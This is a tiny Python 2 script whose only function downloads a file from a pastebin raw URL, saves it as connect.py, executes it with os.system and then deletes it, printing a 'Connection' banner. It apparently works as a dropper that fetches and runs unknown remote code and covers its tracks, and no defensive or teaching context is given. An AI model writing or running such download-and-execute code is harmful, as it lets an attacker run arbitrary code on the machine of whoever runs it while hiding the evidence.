import os
import urllib

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve("http://pastebin.com/raw/0dbGx4eq", "connect.py")
	os.system("python connect.py")
	os.remove("connect.py")
